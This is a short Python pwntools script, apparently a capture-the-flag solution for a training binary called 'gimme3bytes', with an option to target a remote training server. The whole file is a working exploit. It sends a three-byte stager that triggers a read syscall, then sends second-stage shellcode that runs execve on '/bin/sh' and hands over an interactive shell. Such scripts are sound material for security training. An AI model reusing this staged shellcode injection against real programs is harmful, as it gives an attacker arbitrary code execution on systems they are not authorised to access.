from pwn import *
import sys
import time

asm_read = """
pop rdx
syscall
"""

asm_code = """
nop
nop
nop
mov rdi, rsi
add rdi, 25
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
"""

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./gimme3bytes")
		gdb.attach(p, """
		b *play+601
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./gimme3bytes"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2004)
else:
	p = process("./gimme3bytes")

p.send(asm(asm_read))
input("Send code...")
p.send(asm(asm_code))

p.interactive()